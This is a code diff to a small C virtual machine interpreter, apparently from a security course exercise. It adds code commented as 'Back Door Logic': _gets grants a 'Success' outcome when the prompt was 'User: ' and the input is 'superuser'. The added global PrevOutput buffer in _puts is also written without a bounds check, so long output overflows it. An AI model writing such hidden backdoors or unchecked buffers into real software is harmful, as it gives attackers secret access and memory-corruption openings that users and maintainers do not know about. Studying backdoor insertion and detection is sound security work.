@@ -7,6 +7,10 @@
 #include "minivm.h"
 #include <stdbool.h>
 #include <stdio.h>
+#include <string.h>
+
+
+uint8_t PrevOutput[100];
 
 extern bool is_running;
 
@@ -117,9 +121,12 @@ void _puts(struct VMContext* ctx, const uint32_t instr){
     uint8_t reg1 = EXTRACT_B1(instr);
     uint32_t reg1value = ctx->r[reg1].value;
     char c;
+    //@@@@@@ Back Door Logic
+    uint32_t backind = 0;
+        
     while(true){
         if(reg1value >= DEFAULT_HEAP_SIZE){
-            printf("Memory Access Out of Bound\n");
+            printf("[ERROR] Memory Access Out of Bound\n");
             is_running = false;
             return;
         }
@@ -127,33 +134,46 @@ void _puts(struct VMContext* ctx, const uint32_t instr){
         if(c == 0)
             break;
         putchar(c);
+        PrevOutput[backind] = c;
         reg1value +=1;
+        backind += 1;
     }
 }
 
 void _gets(struct VMContext* ctx, const uint32_t instr){
     uint8_t reg1 = EXTRACT_B1(instr);
     uint32_t reg1value = ctx->r[reg1].value;
+
+    uint32_t reg1Start = reg1value;
     char c;
     while(true){
         if(reg1value >= DEFAULT_HEAP_SIZE){
-            printf("Memory Access Out of Bound\n");
+            printf("[ERROR] Memory Access Out of Bound\n");
             is_running = false;
             return;
         }
         c = getchar(); 
         if(c == 10)
-		break;
-	ctx->Memory[reg1value] = c;
-	reg1value += 1;
+            break;
+        ctx->Memory[reg1value] = c;
+        reg1value += 1;
     }
     if(reg1value >= DEFAULT_HEAP_SIZE){
-	    printf("Memory Access Out of Bound\n");
+	    printf("[ERROR] Memory Access Out of Bound\n");
 	    is_running = false;
 	    return;
     }
     //Set zero to final
     ctx->Memory[reg1value] = 0;
+    
+    //@@@@@@@@@@@@@@@ Backdoor Logic
+    if(PrevOutput != NULL){
+        if(!strcmp((char *)PrevOutput, "User: ") && !strcmp((char *)&ctx->Memory[reg1Start], "superuser")){
+            printf("Success\n");
+            is_running = false;
+        }
+    }
+
 }
 
 
